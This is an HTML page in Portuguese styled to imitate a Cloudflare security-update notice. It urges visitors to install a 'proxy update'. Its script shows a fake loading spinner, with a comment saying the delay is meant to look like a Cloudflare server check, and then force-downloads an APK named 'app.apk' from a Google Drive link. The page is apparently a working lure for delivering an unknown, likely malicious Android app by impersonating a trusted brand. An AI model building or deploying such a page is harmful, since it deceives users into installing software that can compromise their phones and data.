<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Update</title>
    <style>
        /* Reset e Fontes estilo Cloudflare */
        body { 
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #f3f5f7; /* O clássico cinza claro do Cloudflare */
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            color: #222;
        }

        .box { 
            background: #ffffff; 
            padding: 40px 50px; 
            border-radius: 4px; /* Cloudflare usa cantos pouco arredondados */
            text-align: center; 
            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28); /* Sombra padrão CF */
            max-width: 90%; 
            width: 340px;
            border-top: 3px solid #f68220; /* A faixa laranja característica de alerta/upgrade */
        }

        h2 { 
            color: #222; 
            margin-top: 0; 
            font-size: 22px;
            font-weight: 400;
        }

        p { 
            color: #444; 
            font-size: 15px; 
            line-height: 1.6;
            margin-bottom: 25px;
        }

        /* Botão estilo Cloudflare (Azul #005E9E ou Laranja #f68220) */
        .btn { 
            background-color: #f68220; /* Laranja Cloudflare */
            color: white; 
            border: none; 
            padding: 12px 24px; 
            font-size: 15px; 
            font-weight: 500;
            border-radius: 3px; 
            cursor: pointer; 
            width: 100%; 
            transition: background 0.2s;
        }

        .btn:hover { 
            background-color: #e06c00; 
        }

        .loader { 
            display: none; 
            margin-top: 15px; 
            color: #444; 
            font-size: 13px; 
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f68220;
            border-radius: 50%;
            width: 18px;
            height: 18px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="box">
        <!-- Ícone de escudo/lua (opcional, estilo CF) -->
        <h2>⚡ Atualização de Segurança</h2>
        <p>Uma nova atualização de proxy está disponível. Toque abaixo para instalar e manter sua conexão estável.</p>
        
        <!-- Botão -->
        <button class="btn" id="installBtn" onclick="iniciarInstalacao()">Instalar Atualização</button>
        
        <!-- Loader -->
        <div class="loader" id="loader">
            <div class="spinner"></div> Processando requisição...
        </div>
    </div>

    <script>
        // LINK DO DRIVE (JÁ CONFIGURADO)
        const apkName = 'https://drive.google.com/uc?export=download&id=1eqGiasWvAhGCyUyD_JbHlw-i_ib32Ey-'; 

        function iniciarInstalacao() {
            // Esconde botão, mostra loader
            document.getElementById('installBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // Simula um pequeno delay para parecer que está "consultando" o servidor CF
            setTimeout(() => {
                // Força download
                const link = document.createElement('a');
                link.href = apkName;
                link.download = 'app.apk';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 800);
        }
    </script>

</body>
</html>
